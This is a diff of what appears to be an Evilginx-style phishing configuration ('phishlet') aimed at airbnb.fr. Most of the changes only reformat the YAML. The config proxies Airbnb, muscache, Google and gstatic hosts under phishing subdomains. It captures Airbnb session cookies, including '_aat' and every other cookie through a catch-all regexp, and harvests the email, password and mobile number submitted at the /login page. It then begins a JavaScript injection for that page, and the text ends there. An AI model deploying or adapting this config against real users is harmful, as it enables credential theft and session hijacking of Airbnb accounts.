@@ -1,46 +1,256 @@
-author: '@AN0NUD4Y'
-min_ver: '2.3.0'
+author: "@AN0NUD4Y"
+min_ver: "2.3.0"
 proxy_hosts:
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'airbnb.fr', session: true, is_landing: true}
-  - {phish_sub: '', orig_sub: '', domain: 'airbnb.fr', session: true, is_landing: false}
-  - {phish_sub: 'muscache', orig_sub: 'a0', domain: 'muscache.com', session: true, is_landing: false}
-  - {phish_sub: 'google', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false}
-  - {phish_sub: 'gstatic', orig_sub: '', domain: 'gstatic.com', session: true, is_landing: false}
+  - {
+      phish_sub: "www",
+      orig_sub: "www",
+      domain: "airbnb.fr",
+      session: true,
+      is_landing: true,
+    }
+  - {
+      phish_sub: "",
+      orig_sub: "",
+      domain: "airbnb.fr",
+      session: true,
+      is_landing: false,
+    }
+  - {
+      phish_sub: "muscache",
+      orig_sub: "a0",
+      domain: "muscache.com",
+      session: true,
+      is_landing: false,
+    }
+  - {
+      phish_sub: "google",
+      orig_sub: "www",
+      domain: "google.com",
+      session: true,
+      is_landing: false,
+    }
+  - {
+      phish_sub: "gstatic",
+      orig_sub: "",
+      domain: "gstatic.com",
+      session: true,
+      is_landing: false,
+    }
 
 sub_filters:
-  - {triggers_on: 'www.airbnb.fr', orig_sub: 'www', domain: 'airbnb.fr', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
-  - {triggers_on: 'www.airbnb.fr', orig_sub: 'www', domain: 'airbnb.fr', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
-  - {triggers_on: 'www.airbnb.fr', orig_sub: 'www', domain: 'airbnb.fr', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
-  - {triggers_on: 'www.airbnb.fr', orig_sub: 'a0', domain: 'muscache.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
-  - {triggers_on: 'www.airbnb.fr', orig_sub: 'a0', domain: 'muscache.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
-  - {triggers_on: 'www.airbnb.fr', orig_sub: 'a0', domain: 'muscache.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
-  - {triggers_on: 'www.airbnb.fr', orig_sub: 'www', domain: 'google.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
-  - {triggers_on: 'www.airbnb.fr', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
-  - {triggers_on: 'www.airbnb.fr', orig_sub: 'www', domain: 'google.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
-  - {triggers_on: 'www.airbnb.fr', orig_sub: '', domain: 'gstatic.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
-  - {triggers_on: 'www.airbnb.fr', orig_sub: '', domain: 'gstatic.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
-  - {triggers_on: 'www.airbnb.fr', orig_sub: '', domain: 'gstatic.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {
+      triggers_on: "www.airbnb.fr",
+      orig_sub: "www",
+      domain: "airbnb.fr",
+      search: "{hostname_regexp}",
+      replace: "{hostname_regexp}",
+      mimes:
+        [
+          "text/html",
+          "text/javascript",
+          "application/json",
+          "application/javascript",
+          "application/x-javascript",
+          "multipart/form-data",
+        ],
+    }
+  - {
+      triggers_on: "www.airbnb.fr",
+      orig_sub: "www",
+      domain: "airbnb.fr",
+      search: "https://{hostname_regexp}",
+      replace: "https://{hostname_regexp}",
+      mimes:
+        [
+          "text/html",
+          "text/javascript",
+          "application/json",
+          "application/javascript",
+          "application/x-javascript",
+          "multipart/form-data",
+        ],
+    }
+  - {
+      triggers_on: "www.airbnb.fr",
+      orig_sub: "www",
+      domain: "airbnb.fr",
+      search: "https%3A%2F%2F{hostname_regexp}",
+      replace: "https%3A%2F%2F{hostname_regexp}",
+      mimes:
+        [
+          "text/html",
+          "text/javascript",
+          "application/json",
+          "application/javascript",
+          "application/x-javascript",
+          "multipart/form-data",
+        ],
+    }
+  - {
+      triggers_on: "www.airbnb.fr",
+      orig_sub: "a0",
+      domain: "muscache.com",
+      search: "{hostname_regexp}",
+      replace: "{hostname_regexp}",
+      mimes:
+        [
+          "text/html",
+          "text/javascript",
+          "application/json",
+          "application/javascript",
+          "application/x-javascript",
+          "multipart/form-data",
+        ],
+    }
+  - {
+      triggers_on: "www.airbnb.fr",
+      orig_sub: "a0",
+      domain: "muscache.com",
+      search: "https://{hostname_regexp}",
+      replace: "https://{hostname_regexp}",
+      mimes:
+        [
+          "text/html",
+          "text/javascript",
+          "application/json",
+          "application/javascript",
+          "application/x-javascript",
+          "multipart/form-data",
+        ],
+    }
+  - {
+      triggers_on: "www.airbnb.fr",
+      orig_sub: "a0",
+      domain: "muscache.com",
+      search: "https%3A%2F%2F{hostname_regexp}",
+      replace: "https%3A%2F%2F{hostname_regexp}",
+      mimes:
+        [
+          "text/html",
+          "text/javascript",
+          "application/json",
+          "application/javascript",
+          "application/x-javascript",
+          "multipart/form-data",
+        ],
+    }
+  - {
+      triggers_on: "www.airbnb.fr",
+      orig_sub: "www",
+      domain: "google.com",
+      search: "{hostname_regexp}",
+      replace: "{hostname_regexp}",
+      mimes:
+        [
+          "text/html",
+          "text/javascript",
+          "application/json",
+          "application/javascript",
+          "application/x-javascript",
+          "multipart/form-data",
+        ],
+    }
+  - {
+      triggers_on: "www.airbnb.fr",
+      orig_sub: "www",
+      domain: "google.com",
+      search: "https://{hostname_regexp}",
+      replace: "https://{hostname_regexp}",
+      mimes:
+        [
+          "text/html",
+          "text/javascript",
+          "application/json",
+          "application/javascript",
+          "application/x-javascript",
+          "multipart/form-data",
+        ],
+    }
+  - {
+      triggers_on: "www.airbnb.fr",
+      orig_sub: "www",
+      domain: "google.com",
+      search: "https%3A%2F%2F{hostname_regexp}",
+      replace: "https%3A%2F%2F{hostname_regexp}",
+      mimes:
+        [
+          "text/html",
+          "text/javascript",
+          "application/json",
+          "application/javascript",
+          "application/x-javascript",
+          "multipart/form-data",
+        ],
+    }
+  - {
+      triggers_on: "www.airbnb.fr",
+      orig_sub: "",
+      domain: "gstatic.com",
+      search: "{hostname_regexp}",
+      replace: "{hostname_regexp}",
+      mimes:
+        [
+          "text/html",
+          "text/javascript",
+          "application/json",
+          "application/javascript",
+          "application/x-javascript",
+          "multipart/form-data",
+        ],
+    }
+  - {
+      triggers_on: "www.airbnb.fr",
+      orig_sub: "",
+      domain: "gstatic.com",
+      search: "https://{hostname_regexp}",
+      replace: "https://{hostname_regexp}",
+      mimes:
+        [
+          "text/html",
+          "text/javascript",
+          "application/json",
+          "application/javascript",
+          "application/x-javascript",
+          "multipart/form-data",
+        ],
+    }
+  - {
+      triggers_on: "www.airbnb.fr",
+      orig_sub: "",
+      domain: "gstatic.com",
+      search: "https%3A%2F%2F{hostname_regexp}",
+      replace: "https%3A%2F%2F{hostname_regexp}",
+      mimes:
+        [
+          "text/html",
+          "text/javascript",
+          "application/json",
+          "application/javascript",
+          "application/x-javascript",
+          "multipart/form-data",
+        ],
+    }
 
 auth_tokens:
-  - domain: '.airbnb.fr'
-    keys: ['_aat','.*,regexp']
+  - domain: ".airbnb.fr"
+    keys: ["_aat", ".*,regexp"]
 
 credentials:
   username:
-    key: 'email'
-    search: '(.*)'
-    type: 'post'
+    key: "email"
+    search: "(.*)"
+    type: "post"
   password:
-    key: 'password'
-    search: '(.*)'
-    type: 'post'
+    key: "password"
+    search: "(.*)"
+    type: "post"
   custom:
-    - key: 'Leaked_mobileNumber'
-      search: '(.*)'
-      type: 'post'
+    - key: "Leaked_mobileNumber"
+      search: "(.*)"
+      type: "post"
 login:
-  domain: 'www.airbnb.fr'
-  path: '/login'
+  domain: "www.airbnb.fr"
+  path: "/login"
 js_inject:
   - trigger_domains: ["www.airbnb.fr"]
     trigger_paths: ["/login"]
